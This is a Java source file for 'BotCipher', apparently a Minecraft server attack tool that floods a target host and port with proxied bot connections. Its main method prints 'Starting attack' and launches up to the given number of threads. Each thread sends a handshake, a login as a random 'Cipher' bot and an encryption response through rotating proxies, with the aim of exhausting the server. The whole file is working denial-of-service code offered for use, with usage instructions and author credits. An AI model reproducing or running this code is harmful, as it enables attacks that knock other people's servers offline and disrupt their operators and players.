package me.nzxter.botcipher;

import java.awt.Color;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.SocketImpl;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;

public class BotCipher {
	private static final ProxyManager proxyManager = new ProxyManager();

	private static Random random = new Random();

	public static int threads = 0;
	public static int number = 0;
	
	public static void pingBytes(int n) {
		number = n;
	}

	public static void main(String[] args) {
		if (args.length == 4) {
			try {
				BotCipher.pingThreadCrasher(args[0], Integer.valueOf(args[1]), Integer.valueOf(args[2]),
						Integer.valueOf(args[3]));
			} catch (NumberFormatException | InterruptedException e) {
			}
		} else {
			System.out.println("By NzxterMC / MHF_TikTok / M.F");
			System.out.println();
			System.out.println("java -jar botcipher.jar <host> <port> <threads> <time>");
			System.out.println();
			System.out.println("Working for Proxys and Server");
		}
	}

	public static void pingThreadCrasher(String host, int port, int maxThreads, long time) throws InterruptedException {
		System.out.println();
		System.out.println("-------------------------");
		System.out.println("Starting attack");
		System.out.println();
		System.out.println("Host: " + host);
		System.out.println("Port: " + port);
		System.out.println("Threads: " + maxThreads);
		System.out.println("Time: " + time);
		System.out.println("-------------------------");
		System.out.println();

		Thread.sleep(3000);

		time = TimeUnit.SECONDS.toMillis(time);
		long time1 = System.currentTimeMillis();

		do {
			if (threads < maxThreads) {
				new Thread() {

					@Override
					public void run() {
						++threads;
						try {
							BotCipher.pingBytes(number + 1);
							
							BotCipher.botjoiner(host, port);

							System.out.println("New #" + number);
						} catch (Exception exception) {
						}
						--threads;
					}
				}.start();
			}
		} while ((System.currentTimeMillis() - time1) < time);

		System.out.println();
		System.out.println("Starting attack stopped");
		System.out.println();

		System.exit(0);
	}
	
	public static void botjoiner(String host, int port)
			throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException,
			NoSuchMethodException, InvocationTargetException, IOException, NoSuchAlgorithmException, InvalidKeySpecException, NoSuchPaddingException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, InterruptedException {
			
			Proxy proxy = proxyManager.nextProxy();
	
			Socket socket = new Socket(proxy);
		
			System.out.println("Proxy: " + proxy.address());
	
			socket.connect(new InetSocketAddress(host, port));
			
	        Thread.sleep(1000L);
			
			DataOutputStream out = new DataOutputStream(socket.getOutputStream());

	        DataInputStream in = new DataInputStream(socket.getInputStream());

	        PacketUtils.sendPacket(PacketUtils.createHandshakeMessage18(host, port, 2), out);
	        
	        PacketUtils.sendPacket(PacketUtils.createLogin("Cipher" + random.nextInt(9999)), out);
	        
	        int t = PacketUtils.readVarInt(in);
	        byte[] packetdata = new byte[t];
	        in.readFully(packetdata, 0, t);
	        DataInputStream input = new DataInputStream(new ByteArrayInputStream(packetdata));
	        int id = PacketUtils.readVarInt(input);
	        if (id == 0) {
	            socket.close();
	        }
	        if (id != 1) {
	        PublicKey pkey = KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(PacketUtils.readByteArray(input)));
	        byte[] verifyToken = PacketUtils.readByteArray(in);
	        KeyGenerator kgen = KeyGenerator.getInstance("AES");
	        kgen.init(128);
	        SecretKey key = kgen.generateKey();
	        Cipher c = Cipher.getInstance("RSA");
	        c.init(1, pkey);
	        PacketUtils.sendPacket(PacketUtils.createEncryptionResponsePacket(c.doFinal(key.getEncoded()), c.doFinal(verifyToken)), out);
	        
		    System.out.println("Bytes: " + out.size());
		    socket.close();
		}
	}
}


